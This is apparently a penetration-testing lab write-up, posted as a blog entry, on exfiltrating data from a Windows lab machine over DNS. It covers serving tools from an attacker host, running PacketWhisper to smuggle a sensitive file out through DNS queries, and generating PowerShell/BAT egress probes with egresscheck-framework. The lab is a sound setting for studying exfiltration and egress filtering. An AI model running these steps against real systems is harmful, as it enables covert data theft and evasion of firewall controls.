---
layout: post
title: "Data Exfiltration with DNS"
permalink: /data-exfiltration/
date: 2021-02-16 21:33:45 +0100
categories: tools
---
##### Data Exfiltration Techniques
Equipped with remote access to a machine we want to find ways of exfiltrating data without changing any firewall setting. Here's what we are going to do:

- Assess firewall settings
- Leverage insufficiently secure firewall settings 
- Encrypt interesting data and exfiltrate it using DNS 
- Automatically identify all possible exfiltration ways

⇒ Tools used: Packet Whisper, Wireshark, rdesktop, Egress framework
<br/>
		Network Configuration:
		Intranet Subnet: 172.16.91.0/24
		Under-investigation machine's IP: 172.16.91.100
		Connection Type: RDP		
<br/>


##### Connect to and scrutinize the 172.16.91.100 victim machine
<br/>
To establish the remote connection we use rdesktop  in terminal as follows:

```bash
$ rdesktop 172.16.91.100
```

<br/>


Once we authenticate to the victim we search for interesting files.
On a windows machine it's good to know if Python or Powershell are installed. We can check this in the Windows terminal (cmd.exe) with 

```bash
python --version
```

```bash
powershell ls
```

<br/>
<img src="/assets/images/pts_labs/lab3-pythonpowershellsearch.png" height="100%" width="100%">
<br/>

<details> 
	<summary> <b>Identify if the 172.16.91.100 machine allows any of the commonly used ports for outbound connectivity</b> </summary>

1. Launch a Python server specifying the port of choice in your **_attacker_** machine.
<br/>

```bash
$ cd /tmp 
$ python -m SimpleHTTPServer 8080
```

<br/>

2. Identify the IP address of your attacking machine

```bash
$ ifconfig
```


Let's say we have 172.16.91.16 (attacker machine)


3. Launch a browser on the 172.16.91.100  machine (victim) and navigate to http://172.16.91.16:8080

when testing if port 8080 is allowed outbound connectivity and see if the served by the Python server page loads. If this is the case, the port is allowed outbound connectivity. Otherwise the firewall is blocking access to this specific port.
<br/>
The webiste will present you with the files of the /tmp directory where the Python server was started. If any files exist you will be able to download them.

Inside a real world scenario you can simply launch Wireshark and see if you can sniff any DNS requests originating from the 172.16.91.100 machine.If this was the case then port 53 (UDP) is allowed for outbound connectivity.

</details>
<br/>

Let's summarize that we have identified ports 8080 (TCP) and 53 (UDP) allowed for outbound connectivity.

<br/>

<details> 
  <summary> <b>Exfiltrate a file</b> </summary>

Based on the identified ports the stealthier exfiltration way is through port 53 (UDP). PacketWhisper can help to easil exfiltrate data via DNS requests. It's a Python based tool that you can download from github.

```bash
$ git clone https://github.com/TryCatchHCF/PacketWhisper.git
```


Since we're using the /tmp/server path you can execute above command inside any directory you want.

For easier transfer also download PacketWhisper as a zipped file as follows:
<br/>

```bash
$ wget https://github.com/TryCatchHCF/PacketWhisper/archive/master.zip
```

<br/>
You then run a Python server in the directory where you saved the zipped version of PacketWhisper.
<br/>

```bash
$ python -m SimpleHTTPServer 8080
```

</details>
<br/>

Then you point the browser on the 172.16.91.100 victim machine to your attacking machine IP and port 8080 in order to download the tool. 

<details> 
  <summary> <b>Time to launch PacketWhisper</b> </summary>
	 
	
- Launch Wireshark on your attacking machine
- Launch cmd.exe on the 172.16.91.100 victim machine and go to the  PacketWhisper directory
- Copy the file you want to transfer into the PacketWhisper directory
- Launch PacketWhisper

<br/>

```bash
$ cd c:\Users\Admin\Desktop\PacketWhisper-master\
$ copy c:\Documents\Sensitive\file.txt .\file.txt
$ python packetWhisper.py
1
file.txt
[enter] (leave empty)
1
3
y
[enter]
y
1
```

<br/>

Transmission will now begin. It is slow and takes about 20 minutes to finish the exfiltration. Once finished you will see something similar to the screenshot below.

img.packetwhispertransmission.png


In your attacking machine on Wireshark you will be able to see DNS queries to subdomains of cloudfront.net 

Save the Wireshark capture file with ‘.pcap’ extension. Next, copy the saved pcap file inside the PacketWhispe's directory, for example 'capture.pcap'

Open a new terminal, go to PacketWhisper's directory and execute the following.

```bash
$ python PacketWhisper.py
2
capture.pcap
1
1
3
[enter]
```

<br/>

The file is now decrypted. To view its content double click the file or read it with 

```bash
$ cat decloaked.capture
```

</details>
<br/>


<details> 
  <summary> <b>Automate enumerating all the exfiltration paths and Identify open ports</b> </summary>
	
Let's use egresscheck framework for identifying ports that are allowed outbound connectivity.
<br/>

```bash
$ git clone https://github.com/stufus/egresscheck-framework.git
$ cd egresscheck-framework/
$ ./ecf.py
```

<br/>

You need to configure the tool by specifying:

- your machine's IP (TARGETIP)
- victim's IP (SOURCEIP)
- port range (PORTS)
- the protocol (PROTOCOL)

You can do so as follows:
<br/>

```bash
$ egresschecker> set PORTS 8500-9500
PORTS => 8500-9500(1001ports)

$ egresschecker> set TARGETIP 172.16.91.16
TARGETIP => 172.16.91.16

$ egresschecker> set SOURCEIP 172.16.91.100
SOURCEIP => 172.16.91.100

$ egresschecker> set PROTOCOL tcp
PROTOCOL => TCP

$ egresschecker> generate powershell-cmd
```

<br/>

A code will be generated that makes PowerShell try to access every port from the given range from the victim machine on your attacker machine.

Before initiating the procedure on the victim machine make sure to

- transfer this command to the victim machine
- run Wireshark on your attacking machine
- execute the command on the victim machine

<br/>
<img src="/assets/images/pts_labs/lab3-egresscheckerpowershell.png" height="100%" width="100%">
<br/>

You can transfer the command using the Python server as before. Simply go to the directory where the egresscheck framework generated a BAT file. Egresscheck informs you of this BAT file with a message, similar to this one:

<br/>
```bash
"Also written to:/tmp/egress_2019jan16_125152_VNcIt8.bat"
```

To serve it use the Python server.

```bash
$ cd tmp
$ python -m SimpleHTTPServer 8080
```

Now, go to the victim machine and point the browser to the attacking machine again.
Download the .bat file on the victim machine.
Go back to your attacking machine, execute Wireshark again.
Now, go to the victim machine and right-click the downloaded BAT file and click “Run as administrator.”

</details>
<br/>

Now, go to your attacking machine, check Wireshark and observe the traffic.
If there is another hidden open port in the network in Wireshark it will now show.

After a short period of time - and if we are lucky - Wireshark will receive a packet destined to an open port –which means that this port is also allowed outbound connectivity on the victim machine’s firewall. In case you can't use nmap this is a useful tool to have in mind.
